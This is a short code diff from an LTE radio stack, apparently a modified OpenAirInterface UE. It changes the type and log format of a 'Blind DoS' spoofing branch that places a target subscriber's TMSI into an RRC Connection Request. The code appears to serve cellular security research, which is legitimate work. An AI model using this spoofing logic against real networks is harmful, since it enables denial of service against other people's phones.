@@ -2172,8 +2172,8 @@ uint8_t do_RRCConnectionRequest(uint8_t Mod_id, uint8_t *buffer, size_t buffer_s
   rrcConnectionRequest->criticalExtensions.present = LTE_RRCConnectionRequest__criticalExtensions_PR_rrcConnectionRequest_r8;
 
   if (tmsi_blind_dos_rrc /* != 0 */) {
-    int tmsi = tmsi_blind_dos_rrc;
-    LOG_I(RRC, "[Blind DoS] Spoofing attack, target TMSI: %d\n", tmsi);
+    uint64_t tmsi = tmsi_blind_dos_rrc;
+    LOG_I(RRC, "[Blind DoS] Spoofing attack, target TMSI: %ld\n", tmsi);
     rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.present = LTE_InitialUE_Identity_PR_s_TMSI;
     rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.mmec.size = 1;
     rrcConnectionRequest->criticalExtensions.choice.rrcConnectionRequest_r8.ue_Identity.choice.s_TMSI.mmec.bits_unused = 0;
